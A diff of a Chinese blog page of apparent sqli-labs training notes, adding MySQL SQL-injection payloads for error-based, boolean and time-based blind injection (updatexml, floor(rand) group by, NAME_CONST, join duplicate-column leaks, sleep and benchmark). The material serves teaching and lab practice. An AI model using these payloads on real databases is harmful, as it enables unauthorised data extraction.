@@ -50,7 +50,7 @@
 
 <meta itemprop="datePublished" content="2020-11-28T20:04:36&#43;08:00" />
 <meta itemprop="dateModified" content="2020-11-28T20:04:36&#43;08:00" />
-<meta itemprop="wordCount" content="960">
+<meta itemprop="wordCount" content="1225">
 
 
 
@@ -131,8 +131,8 @@
         <div class="post-category">
             <a href="/categories/security/"> security </a>
             </div>
-          <span class="more-meta"> 约 960 字 </span>
-          <span class="more-meta"> 预计阅读 2 分钟 </span>
+          <span class="more-meta"> 约 1225 字 </span>
+          <span class="more-meta"> 预计阅读 3 分钟 </span>
         <span id="busuanzi_container_page_pv" class="more-meta"> <span id="busuanzi_value_page_pv"><img src="/img/spinner.svg" alt="spinner.svg"/></span> 次阅读 </span>
       </div>
     </header>
@@ -153,8 +153,11 @@
 <li><a href="#information-schema数据库">information_schema数据库</a></li>
 <li><a href="#基于布尔的盲注">基于布尔的盲注</a></li>
 <li><a href="#基于报错的盲注">基于报错的盲注</a></li>
+<li><a href="#基于时间的盲注">基于时间的盲注</a></li>
 </ul></li>
+<li><a href="#notice">Notice</a></li>
 <li><a href="#less-1-4">Less-1~4</a></li>
+<li><a href="#less-5">Less-5</a></li>
 </ul></li>
 </ul>
 </nav>
@@ -234,8 +237,8 @@
 <li><code>substr(a,b,c)</code> 函数：从b位置开始，截取字符串a的c长度。</li>
 <li><code>ascii()</code> 函数：将某个字符转换为ascii值。</li>
 <li><code>mid(a,b,c)</code> 函数：从位置b开始，截取a字符串的c位。</li>
-<li><code>Ord()</code> 函数：同ascii()，将字符转为ascii值。</li>
-<li>regexp正则注入：例如， <code>select*fromuserswhereid=1and1=(if((user()regexp'^r'),1,0));</code> 。</li>
+<li><code>ord()</code> 函数：同ascii()，将字符转为ascii值。</li>
+<li>regexp正则注入：例如， <code>select * from users where id=1 and 1=(if((user() regexp '^r'),1,0));</code> 。</li>
 <li>ike匹配注入：例如，<code>select id,username,password from users where 1=(user() like 'roo%');</code> 。</li>
 </ul>
 
@@ -248,8 +251,34 @@
 <li><code>updatexml(1,exp,1)</code> 函数：例如， <code>select updatexml(1,@@datadir,1);</code> 。</li>
 <li>常用的报错注入方式： <code>select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a;</code> ,可以简化成： <code>select count(*) from information_schema.tables group by concat(version(),floor(rand(0)*2));</code> ,如果关键表被禁用了，可以变成： <code>select count(*) from(select 1 union select null union select !1)a group by concat(version(),floor(rand(0)*2));</code> ,如果rand()被禁用了，可以变成： <code>select min(@a:=1) from information_schema.tables group by concat(version(),@a:=(@a+1)%2);</code> 。</li>
 <li>利用重复报错特性：例如， <code>select * from(select NAME_CONST(version(),1),NAME_CONST(version(),1))x;</code> 。</li>
-<li>利用溢出报错特性： 例如， <code>select exp(~(select * FROM(SELECT USER())a));</code> 或者 <code>select !(select * from(select user())x)- ~0;</code> 。</li>
+<li>利用溢出报错特性（需要一定版本要求）： 例如， <code>select exp(~(select * FROM(SELECT USER())a));</code> 或者 <code>select !(select * from(select user())x)- ~0;</code> 。</li>
 </ul>
+
+<p>还有一个特殊的重复报错方式如下,可以爆列名，如果information_schema数据库被禁用，可以使用这个方式：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">mysql&gt; select *  from(select * from test a join test b)c;
+ERROR 1060 (42S21): Duplicate column name &#39;id&#39;
+mysql&gt; select *  from(select * from test a join test b using(id))c;
+ERROR 1060 (42S21): Duplicate column name &#39;name&#39;</pre></td></tr></table>
+</div>
+</div>
+<h3 id="基于时间的盲注">基于时间的盲注</h3>
+
+<ul>
+<li><code>sleep()</code> 函数：例如， <code>select * from information_schema.tables where 1=1 and if(mid(user(),1,1)=char(114),sleep(5),1);</code> 。</li>
+<li><code>benchmark()</code> 函数：例如， <code>select if(mid(version(),1,1)=8,benchmark(5000000,md5('hack_by_p1n93r')),null) from users;</code> 。</li>
+</ul>
+
+<h2 id="notice">Notice</h2>
+
+<p>只打一些有代表性的过关，目的是过一遍理论知识。没时间全部打，事实上很多关没有代表性，还不如打CTF的SQLI，比较有代表性。</p>
 
 <h2 id="less-1-4">Less-1~4</h2>
 
@@ -271,11 +300,15 @@
 
 <p>爆列：</p>
 
-<p><img src="./../media/2020-12-03-3.png" alt="less-1爆列" /></p>
+<p><img src="./../media/2020-12-03-4.png" alt="less-1爆列" /></p>
 
 <p>爆数据：</p>
 
-<p>![less-1爆数据][p9]</p>
+<p><img src="./../media/2020-12-03-3.png" alt="less-1爆数据" /></p>
+
+<h2 id="less-5">Less-5</h2>
+
+<p>没有数据回显，但是查询成功和查询失败的响应有区别，所以可以用基于布尔和时间的盲注，且能显示错误信息，所以可以利用基于报错的盲注。</p>
 
     </div>
 
